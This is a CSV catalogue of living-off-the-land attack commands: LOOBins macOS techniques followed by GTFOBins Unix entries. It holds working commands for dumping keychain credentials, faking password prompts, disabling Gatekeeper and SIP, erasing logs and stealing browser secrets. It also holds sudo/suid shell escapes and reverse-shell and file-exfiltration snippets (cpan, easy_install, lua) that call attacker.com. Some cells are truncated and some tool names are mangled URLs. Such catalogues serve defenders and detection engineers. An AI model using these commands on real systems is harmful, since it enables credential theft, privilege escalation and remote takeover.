Tools,Service,Port,Syntax & Description,Tags,MITRE ATT&CK
Restore a backup,LOOBins,,"tmutil restore /path/to/backup""","LOOBins, LOTL (Living Off The Land)",
Retrieves active session,LOOBins,,"odutil show sessions""","LOOBins, LOTL (Living Off The Land)",
Use the osascript binary to prompt the user for credentials,LOOBins,,"`osascript -e 'set popup to display dialog ""Keychain Access wants to use the login keychain"" & return & return & ""Please enter the keychain password"" & return default answer """" with icon file ""System","LOOBins, LOTL (Living Off The Land)",
Enable Remote Apple Events,LOOBins,,"sudo systemsetup -setremoteappleevents on\n""","LOOBins, LOTL (Living Off The Land)",
Execute malicious dynamic library (.dylib) from standard input,LOOBins,,"'echo ""load bad.dylib"" | tclsh'","LOOBins, LOTL (Living Off The Land)",
Use the osascript binary to execute a JXA (JavaScript for Automation) file.,LOOBins,,"`echo ""ObjC.import('Cocoa');\\nObjC.import('stdlib');\\nvar currentApp = Application.currentApplication();\\ncurrentApp.includeStandardAdditions = true;\\ncurrentApp.doShellScript('open -a Calculator.app');"" > calc.js && osascript -l JavaScript calc.js`","LOOBins, LOTL (Living Off The Land)",
Set app to run with dock icon hidden,LOOBins,,"'plutil -insert LSUIElement -string ""1"" /Applications/TargetApp.app/Contents/Info.plist'","LOOBins, LOTL (Living Off The Land)",
Use the osascript binary to gather system information,LOOBins,,"osascript -e 'return (system info)'""","LOOBins, LOTL (Living Off The Land)",
network device enumeration,LOOBins,,"networksetup -listallnetworkservices""","LOOBins, LOTL (Living Off The Land)",
Disable authenticated-root,LOOBins,,"csrutil authenticated-root disable""","LOOBins, LOTL (Living Off The Land)",
Execute Swift one-liner with swift 5.8 / Xcode 14.3 Beta 1 or greater,LOOBins,,`swift -e 'import Foundation; let process = Process(); process.executableURL = URL(fileURLWithPath,"LOOBins, LOTL (Living Off The Land)",
Download file,LOOBins,,nscurl -k https,"LOOBins, LOTL (Living Off The Land)",
Disable Time Machine,LOOBins,,"tmutil disable""","LOOBins, LOTL (Living Off The Land)",
"Retrieves ""Contact search policy""",LOOBins,,"odutil show configuration /Contacts""","LOOBins, LOTL (Living Off The Land)",
Change a file's creation and modification timestamps,LOOBins,,"'SetFile -d ""04/25/2023 11","LOOBins, LOTL (Living Off The Land)",
Tamper with system logs,LOOBins,,"mkdir /tmp/snapshot\ntmutil localsnapshot\ntmutil listlocalsnapshots /\nmount_apfs -o noowners -s com.apple.TimeMachine.2023-05-01-090000.local /System/Volumes/Data /tmp/snapshot\nopen /tmp/snapshot\nsudo vim /var/log/system.log\ntmutil restore com.apple.TimeMachine.2023-05-01-090000.local""","LOOBins, LOTL (Living Off The Land)",
Disable Gatekeeper,LOOBins,,"sudo spctl --master-disable""","LOOBins, LOTL (Living Off The Land)",
Local user enumeration,LOOBins,,"dscl . -list /Users""","LOOBins, LOTL (Living Off The Land)",
Map infrastructure,LOOBins,,"csrutil netboot list""","LOOBins, LOTL (Living Off The Land)",
Get nvram variables,LOOBins,,"nvram -p""","LOOBins, LOTL (Living Off The Land)",
Export local host groups,LOOBins,,dsexport local_groups.txt /Local/Default dsRecTypeStandard,"LOOBins, LOTL (Living Off The Land)",
Set auto proxy URL for an interface,LOOBins,,"'networksetup -setautoproxyurl ""Wi-Fi"" $autoProxyURL'","LOOBins, LOTL (Living Off The Land)",
DNS server enumeration,LOOBins,,"networksetup -getdnsservers Wi-Fi""","LOOBins, LOTL (Living Off The Land)",
Generate payload directory (Shlayer),LOOBins,,"'export tmpDir=""$(mktemp -d /tmp/XXXXXXXXXXXX)""'","LOOBins, LOTL (Living Off The Land)",
"Copy, compress, and transfer sensitive data to a remote macOS host",LOOBins,,"ditto -c --norsrc /home/user/sensitive-files - | ssh remote_host ditto -x --norsrc - /home/user/l00t""","LOOBins, LOTL (Living Off The Land)",
Query File Paths,LOOBins,,"xargs -0 mdls -n kMDItemPath -n kMDItemFSSize""","LOOBins, LOTL (Living Off The Land)",
Active Directory user enumeration,LOOBins,,"'dscl ""/Active Directory/TEST/All Domains"" -list /Users'","LOOBins, LOTL (Living Off The Land)",
Fork a process,LOOBins,,"caffeinate -i /tmp/evil""","LOOBins, LOTL (Living Off The Land)",
network device enumeration,LOOBins,,"networksetup -listnetworkserviceorder""","LOOBins, LOTL (Living Off The Land)",
Bypass Gatekeeper via xattr,LOOBins,,"xattr -d com.apple.quarantine FILE""","LOOBins, LOTL (Living Off The Land)",
Retrieving macOS Version Information,LOOBins,,"sw_vers""","LOOBins, LOTL (Living Off The Land)",
Mount a malicious dmg file,LOOBins,,"hdiutil attach malicious.dmg""","LOOBins, LOTL (Living Off The Land)",
Open a malicious file,LOOBins,,"open Malicious.app""","LOOBins, LOTL (Living Off The Land)",
Print software information,LOOBins,,"system_profiler SPSoftwareDataType""","LOOBins, LOTL (Living Off The Land)",
Collect clipboard data,LOOBins,,"osascript -e 'set volume output muted true' ;   say $(pbpaste) -i  > loot.txt;""","LOOBins, LOTL (Living Off The Land)",
,LOOBins,,"system_profiler SPPowerDataType""","LOOBins, LOTL (Living Off The Land)",
Display Login Items,LOOBins,,"sfltool dumpbtm""","LOOBins, LOTL (Living Off The Land)",
Retrieving macOS Build Version,LOOBins,,"sw_vers -buildVersion""","LOOBins, LOTL (Living Off The Land)",
Exclude path from backup,LOOBins,,"tmutil addexclusion /path/to/exclude""","LOOBins, LOTL (Living Off The Land)",
List kernel extensions,LOOBins,,"kexstat""","LOOBins, LOTL (Living Off The Land)",
Execute Swift one-liner before swift 5.8 / Xcode 14.3 Beta 1,LOOBins,,"`echo 'print(""loobins"")' | swift -`","LOOBins, LOTL (Living Off The Land)",
Listing the available datatypes,LOOBins,,"system_profiler -listDataTypes""","LOOBins, LOTL (Living Off The Land)",
Add a login item to the current user,LOOBins,,"sudo defaults write /Library/Preferences/com.apple.loginwindow LoginHook gain_persistence.sh""","LOOBins, LOTL (Living Off The Land)",
Delete a backup,LOOBins,,"tmutil delete /path/to/backup""","LOOBins, LOTL (Living Off The Land)",
Continously capture screenshot,LOOBins,,"'while true; do ts=$(date +""%Y%m%d-%H%M%S""); o=""/tmp/screenshots""; screencapture -x ""$o/ss-$ts.png""; sleep 10; done'","LOOBins, LOTL (Living Off The Land)",
Use launchctl to execute an application,LOOBins,,"sudo launchctl load /Library/LaunchAgent/com.apple.installer""","LOOBins, LOTL (Living Off The Land)",
Use the textutil to read several files and build a new file,LOOBins,,"textutil -convert html Quote.doc secondQuote.doc""","LOOBins, LOTL (Living Off The Land)",
Discover SSH hosts,LOOBins,,"dns-sd -B _ssh._tcp""","LOOBins, LOTL (Living Off The Land)",
Use mdfind to search for AWS Keys,LOOBins,,"mdfind 'kMDItemTextContext == AKIA || kMDItemDisplayName = *AKIA* -onlyin ~'""","LOOBins, LOTL (Living Off The Land)",
Enable auto proxy state,LOOBins,,"'networksetup -setautoproxystate ""Wi-Fi"" on'","LOOBins, LOTL (Living Off The Land)",
Delete the Launch Services database,LOOBins,,"lsregister -delete""","LOOBins, LOTL (Living Off The Land)",
Enumerate the users who are currently logged into the system.,LOOBins,,"'last | grep ""still logged in""'","LOOBins, LOTL (Living Off The Land)",
DLL hjiacking,LOOBins,,"ditto -V /path/to/malicious-library/malicious_library.dylib /path/to/target-library/original_library.dylib""","LOOBins, LOTL (Living Off The Land)",
Bypass Gatekeeper via xattr,LOOBins,,"xattr -d -r com.apple.quarantine *""","LOOBins, LOTL (Living Off The Land)",
Use ioreg to check whether the host is on a physical machine or a VM,LOOBins,,"ioreg -rd1 -c IOPlatformExpertDevice""","LOOBins, LOTL (Living Off The Land)",
Get OS and browser version information,LOOBins,,"softwareupdate --list""","LOOBins, LOTL (Living Off The Land)",
"Retrieves ""Default search policy""",LOOBins,,"odutil show configuration /Search""","LOOBins, LOTL (Living Off The Land)",
Enable safaridriver,LOOBins,,"sudo safaridriver --enable""","LOOBins, LOTL (Living Off The Land)",
"Hostname, localhost name and computername",LOOBins,,"scutil --get { HostName | LocalHostName | ComputerName }""","LOOBins, LOTL (Living Off The Land)",
Remove configuration profiles.,LOOBins,,"profiles remove -identifier com.profile.identifier -password <password>""","LOOBins, LOTL (Living Off The Land)",
Execute Swift code file,LOOBins,,"swift mycode.swift""","LOOBins, LOTL (Living Off The Land)",
Reset Login Items to Defaults,LOOBins,,"sfltool resetbtm""","LOOBins, LOTL (Living Off The Land)",
Check all ioreg properties for hypervisor names.,LOOBins,,"ioreg -l""","LOOBins, LOTL (Living Off The Land)",
Active Directory group enumeration,LOOBins,,"'dscl ""/Active Directory/TEST/All Domains"" -list /Groups'","LOOBins, LOTL (Living Off The Land)",
Set the http web proxy for an interface,LOOBins,,"'networksetup -setwebproxy ""Wi-Fi"" 46.226.108.171'","LOOBins, LOTL (Living Off The Land)",
Enumerate configured web proxy for an interface,LOOBins,,"'networksetup -getwebproxy ""Wi-Fi""'","LOOBins, LOTL (Living Off The Land)",
network device enumeration,LOOBins,,"networksetup -listallhardwareports""","LOOBins, LOTL (Living Off The Land)",
Show mounted servers,LOOBins,,"'defaults read com.apple.finder ""ShowMountedServersOnDesktop""'","LOOBins, LOTL (Living Off The Land)",
Remove extended attributes from a file,LOOBins,,"ditto -c -k unsigned.app app.zip ditto -x -k app.zip unsigned.app 2>/dev/null""","LOOBins, LOTL (Living Off The Land)",
Download a malicious file,LOOBins,,open -g https,"LOOBins, LOTL (Living Off The Land)",
Retrieves the Active Directory configuration,LOOBins,,"dsconfigad -show""","LOOBins, LOTL (Living Off The Land)",
"Dump credentials, keys, certificates, and other senstive information from Keychain",LOOBins,,"sudo security dump-keychain -d login.keychain""","LOOBins, LOTL (Living Off The Land)",
Use pbpaste to collect sensitive clipboard data,LOOBins,,"while true; do echo $(pbpaste) >> loot.txt; sleep 10; done""","LOOBins, LOTL (Living Off The Land)",
Lookup  a user,LOOBins,,"dscacheutil -q user -a name <USER_NAME>""","LOOBins, LOTL (Living Off The Land)",
Print the information of developer tools,LOOBins,,"system_profiler SPDeveloperToolsDataType""","LOOBins, LOTL (Living Off The Land)",
Use mdfind to search for apps to infect,LOOBins,,"`set appId to do shell script ""mdfind kMDItemCFBundleIdentifier = '"" & bundleId & ""'""`","LOOBins, LOTL (Living Off The Land)",
Retrieving macOS Product Version,LOOBins,,"sw_vers -productVersion""","LOOBins, LOTL (Living Off The Land)",
Discover web hosts,LOOBins,,"dns-sd -B _http._tcp""","LOOBins, LOTL (Living Off The Land)",
Add a netboot server,LOOBins,,"csrutil netboot add <address>""","LOOBins, LOTL (Living Off The Land)",
Use ioreg to check USB device vendor names,LOOBins,,"ioreg -rd1 -c IOUSBHostDevice""","LOOBins, LOTL (Living Off The Land)",
Mount a malicious iso file,LOOBins,,"hdiutil attach malicious.iso""","LOOBins, LOTL (Living Off The Land)",
Password policy discovery,LOOBins,,"dscl . -read /Config/shadowhash""","LOOBins, LOTL (Living Off The Land)",
Active Directory user information gathering,LOOBins,,"'dscl ""/Active Directory/TEST/All Domains"" -read /Users/$USERNAME'","LOOBins, LOTL (Living Off The Land)",
Use mdfind to provide live updates to the number of files matching the query,LOOBins,,"mdfind -live passw""","LOOBins, LOTL (Living Off The Land)",
Local group information gathering,LOOBins,,"dscl . -read /Groups/$GROUPNAME""","LOOBins, LOTL (Living Off The Land)",
Execute malicious dynamic library (.dylib) from standard input,LOOBins,,"ssh-keygen -D /private/tmp/evil.dylib""","LOOBins, LOTL (Living Off The Land)",
Listing the available node names,LOOBins,,"odutil show nodenames""","LOOBins, LOTL (Living Off The Land)",
Computer enumration,LOOBins,,"'dscl  ""/Active Directory/TEST/All Domains"" -list /Computers'","LOOBins, LOTL (Living Off The Land)",
Share enumration,LOOBins,,"dscl . -list /SharePoints""","LOOBins, LOTL (Living Off The Land)",
Disable SIP,LOOBins,,"csrutil disable""","LOOBins, LOTL (Living Off The Land)",
Use ioreg to check whether the remote macOS screen is locked.,LOOBins,,"ioreg -n Root -d1 -a | grep CGSSession""","LOOBins, LOTL (Living Off The Land)",
Add an arbitrary trusted certificate to aid a MITM attack,LOOBins,,"security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain bad_cert.crt""","LOOBins, LOTL (Living Off The Land)",
Remove all log messages,LOOBins,,"log erase --all""","LOOBins, LOTL (Living Off The Land)",
Lookup all users,LOOBins,,"dscacheutil -q user""","LOOBins, LOTL (Living Off The Land)",
Enumerate all hosts that have remotely logged into the system before.,LOOBins,,"last | grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'""","LOOBins, LOTL (Living Off The Land)",
Get OS update policy,LOOBins,,"softwareupdate --schedule""","LOOBins, LOTL (Living Off The Land)",
Copy and compress sensitive data locally,LOOBins,,"ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files /tmp/l00t.zip""","LOOBins, LOTL (Living Off The Land)",
Download and compile a payload,LOOBins,,curl https,"LOOBins, LOTL (Living Off The Land)",
Enumerate all user accounts that have logged into the system previously.,LOOBins,,"last -t console""","LOOBins, LOTL (Living Off The Land)",
Enable Remote Login,LOOBins,,"sudo systemsetup -setremotelogin on\n""","LOOBins, LOTL (Living Off The Land)",
Exfiltrate data in dmg file,LOOBins,,"'hdiutil create -volname ""Volume Name"" -srcfolder /path/to/folder -ov diskimage.dmg'","LOOBins, LOTL (Living Off The Land)",
Detect connected network hardware,LOOBins,,"networksetup -detectnewhardware""","LOOBins, LOTL (Living Off The Land)",
Discover hosts serving SMB,LOOBins,,"dns-sd -B _smb._tcp""","LOOBins, LOTL (Living Off The Land)",
Enumerate configured web proxy URL for an interface,LOOBins,,"'networksetup -getautoproxyurl ""Thunderbolt Ethernet""'","LOOBins, LOTL (Living Off The Land)",
Disable Gatekeeper's auto rearm functionality,LOOBins,,"sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO""","LOOBins, LOTL (Living Off The Land)",
Use the osascript binary to gather sensitive clipboard data,LOOBins,,"while true; do echo $(osascript -e 'return (the clipboard)') >> clipdata.txt; sleep 10; done""","LOOBins, LOTL (Living Off The Land)",
View URL associated with file downloads,LOOBins,,"sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* 'select LSQuarantineDataURLString from LSQuarantineEvent'""","LOOBins, LOTL (Living Off The Land)",
Retrieves the Active Directory name,LOOBins,,"dsconfigad -show |awk '/Active Directory Domain/{print $NF}'""","LOOBins, LOTL (Living Off The Land)",
Export local host users,LOOBins,,dsexport local_users.txt /Local/Default dsRecTypeStandard,"LOOBins, LOTL (Living Off The Land)",
Local user information gathering,LOOBins,,"dscl . -read /Users/$USERNAME""","LOOBins, LOTL (Living Off The Land)",
Validate file download information,LOOBins,,"'mdls -name ""kMDItemWhereFroms"" -name ""kMDItemDownloadedDate""'","LOOBins, LOTL (Living Off The Land)",
Get Firefox cookie data,LOOBins,,"'killall firefox; find ~/Library/Application\\ Support/Firefox/Profiles/. | grep cookies.sqlite | xargs -I {} sqlite3 {} ""select * from moz_cookies""'","LOOBins, LOTL (Living Off The Land)",
Network reachability,LOOBins,,"scutil -r { nodename | address | local-address remote-address }""","LOOBins, LOTL (Living Off The Land)",
DNS configuration,LOOBins,,"scutil --dns""","LOOBins, LOTL (Living Off The Land)",
Retrieving macOS Product Name,LOOBins,,"sw_vers -productName""","LOOBins, LOTL (Living Off The Land)",
Proxy configuration,LOOBins,,"scutil --proxy""","LOOBins, LOTL (Living Off The Land)",
Active Directory group information gathering,LOOBins,,"'dscl ""/Active Directory/TEST/All Domains"" -read /Groups/$GROUPNAME'","LOOBins, LOTL (Living Off The Land)",
Mount a malicious dmg file,LOOBins,,"hdiutil mount malicious.dmg""","LOOBins, LOTL (Living Off The Land)",
Prevent a sleep,LOOBins,,"caffeinate -u -t 14400""","LOOBins, LOTL (Living Off The Land)",
Generate directory based on template file (Bundlore),LOOBins,,"'TMP_DIR=""mktemp -d -t x""'","LOOBins, LOTL (Living Off The Land)",
Use sysctl to gather macOS hardware info,LOOBins,,"sysctl -n hw.model""","LOOBins, LOTL (Living Off The Land)",
Exfiltrate data in encrypted dmg file,LOOBins,,"'hdiutil create -encryption -stdinpass -volname ""Volume Name"" -srcfolder /path/to/folder -ov encrypteddiskimage.dmg'","LOOBins, LOTL (Living Off The Land)",
Set the https web proxy for an interface,LOOBins,,"'networksetup -setsecurewebproxy ""Wi-Fi"" 46.226.108.171'","LOOBins, LOTL (Living Off The Land)",
Change a user password,LOOBins,,"dscl . passwd /Users/$USERNAME oldPassword newPassword""","LOOBins, LOTL (Living Off The Land)",
Local group enumeration,LOOBins,,"dscl . -list /Groups""","LOOBins, LOTL (Living Off The Land)",
Get apps with Full Disk access,LOOBins,,"`sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \\\n'select client from access where auth_value and service = ""kTCCServiceSystemPolicyAllFiles""'`","LOOBins, LOTL (Living Off The Land)",
"`Retrieve Chrome's ""Chrome Safe Storage"" password manager secret`",LOOBins,,"'security find-generic-password -w -s ""Chrome Safe Storage""'","LOOBins, LOTL (Living Off The Land)",
Collect system DEP information.,LOOBins,,"sudo profiles show -type enrollment""","LOOBins, LOTL (Living Off The Land)",
Capture clipboard content,LOOBins,,"pbpaste | textutil -stdin -info > Clipboard.txt""","LOOBins, LOTL (Living Off The Land)",
Print hardware information,LOOBins,,"system_profiler SPHardwareDataType""","LOOBins, LOTL (Living Off The Land)",
Iterate through a directory to GetFileInfo,LOOBins,,"for FILE in ~/Downloads/*; do echo $(GetFileInfo $FILE) >> fileinfo.txt; sleep 2; done""","LOOBins, LOTL (Living Off The Land)",
Get a list of apps and their bindings,LOOBins,,"'/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -E ""path","LOOBins, LOTL (Living Off The Land)",
Mount a malicious iso file,LOOBins,,"hdiutil mount malicious.iso""","LOOBins, LOTL (Living Off The Land)",
Set a file or directory attribute to invisible,LOOBins,,"for FILE in ~/*; do echo $(SetFile -a V $FILE && echo $(GetFileInfo $FILE)) >> /tmp/fileinfo.txt; sleep 2; done""","LOOBins, LOTL (Living Off The Land)",
https://www.notion.sotorify.md,GTFOBins,,"shell: torify /bin/sh
sudo: sudo torify /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soservice.md,GTFOBins,,"shell: /usr/sbin/service ../../bin/sh
sudo: sudo service ../../bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sonft.md,GTFOBins,,"file-read: LFILE=file_to_read
nft -f ""$LFILE""

suid: LFILE=file_to_read
./nft -f ""$LFILE""

sudo: LFILE=file_to_read
sudo nft -f ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socpan.md,GTFOBins,,"shell: cpan
! exec '/bin/bash'

reverse-shell: export RHOST=localhost
export RPORT=9000
cpan
! use Socket; my $i=""$ENV{RHOST}""; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp"")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S""); open(STDOUT,"">&S""); open(STDERR,"">&S""); exec(""/bin/sh -i"");};

file-upload: cpan
! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();

file-download: export URL=http://attacker.com/file_to_get
cpan
! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();

sudo: sudo cpan
! exec '/bin/bash'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soeasy_install.mdl,GTFOBins,,"shell: TF=$(mktemp -d)
echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
easy_install $TF

reverse-shell: export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' > $TF/setup.py
easy_install $TF

file-upload: export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py
easy_install $TF

file-upload: export LPORT=8888
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
easy_install $TF

file-download: export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""import os;
os.execl('$(whereis python)', '$(whereis python)', '-c', \""\""\""import sys;
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve('$URL', '$LFILE')\""\""\"")"" > $TF/setup.py
pip install $TF

file-write: export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""import os;
os.execl('$(whereis python)', 'python', '-c', 'open(\""$LFILE\"",\""w+\"").write(\""DATA\"")')"" > $TF/setup.py
easy_install $TF

file-read: TF=$(mktemp -d)
echo 'print(open(""file_to_read"").read())' > $TF/setup.py
easy_install $TF

library-load: TF=$(mktemp -d)
echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py
easy_install $TF

sudo: TF=$(mktemp -d)
echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
sudo easy_install $TF","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sostdbuf.md,GTFOBins,,"shell: stdbuf -i0 /bin/sh
suid: ./stdbuf -i0 /bin/sh -p
sudo: sudo stdbuf -i0 /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.solatex.md,GTFOBins,,"shell: latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'

file-read: latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi

sudo: sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi

sudo: sudo latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'

limited-suid: ./latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.solua.md,GTFOBins,,"shell: lua -e 'os.execute(""/bin/sh"")'
non-interactive-reverse-shell: export RHOST=attacker.com
export RPORT=12345
lua -e 'local s=require(""socket"");
  local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));t:send(b);
  end;
  f:close();t:close();'

non-interactive-bind-shell: export LPORT=12345
lua -e 'local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));c:send(b);
  end;c:close();f:close();'

file-upload: RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
lua -e '
  local f=io.open(os.getenv(""LFILE""), 'rb')
  local d=f:read(""*a"")
  io.close(f);
  local s=require(""socket"");
  local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  t:send(d);
  t:close();'

file-download: export LPORT=12345
export LFILE=file_to_save
lua -e 'local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  local d,x=c:receive(""*a"");
  c:close();
  local f=io.open(os.getenv(""LFILE""), ""wb"");
  f:write(d);
  io.close(f);'

file-write: lua -e 'local f=io.open(""file_to_write"", ""wb""); f:write(""DATA""); io.close(f);'
file-read: lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'
suid: lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'
sudo: sudo lua -e 'os.execute(""/bin/sh"")'
limited-suid: ./lua -e 'os.execute(""/bin/sh"")'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soperlbug.md,GTFOBins,,"shell: perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'
sudo: sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopr.md,GTFOBins,,"file-read: LFILE=file_to_read
pr -T $LFILE

suid: LFILE=file_to_read
pr -T $LFILE

sudo: LFILE=file_to_read
pr -T $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sostrace.md,GTFOBins,,"file-write: LFILE=file_to_write
strace -s 999 -o $LFILE strace - DATA

shell: strace -o /dev/null /bin/sh
suid: ./strace -o /dev/null /bin/sh -p
sudo: sudo strace -o /dev/null /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sorunscript.md,GTFOBins,,"shell: TF=$(mktemp)
echo '! exec /bin/sh' >$TF
runscript $TF

limited-suid: TF=$(mktemp)
echo '! exec /bin/sh' >$TF
./runscript $TF

sudo: TF=$(mktemp)
echo '! exec /bin/sh' >$TF
sudo runscript $TF","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soeqn.md,GTFOBins,,"file-read: LFILE=file_to_read
eqn ""$LFILE""

suid: LFILE=file_to_read
./eqn ""$LFILE""

sudo: LFILE=file_to_read
sudo eqn ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soxmodmap.md,GTFOBins,,"file-read: LFILE=file_to_read
xmodmap -v $LFILE

suid: LFILE=file_to_read
./xmodmap -v $LFILE

sudo: LFILE=file_to_read
sudo xmodmap -v $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sold.so.md,GTFOBins,,"shell: /lib/ld.so /bin/sh
suid: ./ld.so /bin/sh -p
sudo: sudo /lib/ld.so /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sogcc.md,GTFOBins,,"file-read: LFILE=file_to_read
gcc -x c -E ""$LFILE""

file-read: LFILE=file_to_read
gcc @""$LFILE""

file-write: LFILE=file_to_delete
gcc -xc /dev/null -o $LFILE

shell: gcc -wrapper /bin/sh,-s .
sudo: sudo gcc -wrapper /bin/sh,-s .","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.solftp.md,GTFOBins,,"shell: lftp -c '!/bin/sh'
limited-suid: ./lftp -c '!/bin/sh'
sudo: sudo lftp -c '!/bin/sh'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soemacs.md,GTFOBins,,"shell: emacs -Q -nw --eval '(term ""/bin/sh"")'
file-write: emacs file_to_write
DATA
C-x C-s

file-read: emacs file_to_read
suid: ./emacs -Q -nw --eval '(term ""/bin/sh -p"")'
sudo: sudo emacs -Q -nw --eval '(term ""/bin/sh"")'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sosqlite3.md,GTFOBins,,"shell: sqlite3 /dev/null '.shell /bin/sh'
file-write: LFILE=file_to_write
sqlite3 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'

file-read: LFILE=file_to_read
sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF

suid: LFILE=file_to_read
sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF

sudo: sudo sqlite3 /dev/null '.shell /bin/sh'
limited-suid: ./sqlite3 /dev/null '.shell /bin/sh'","GTFOBins, LOTL (Living Off The Land)",
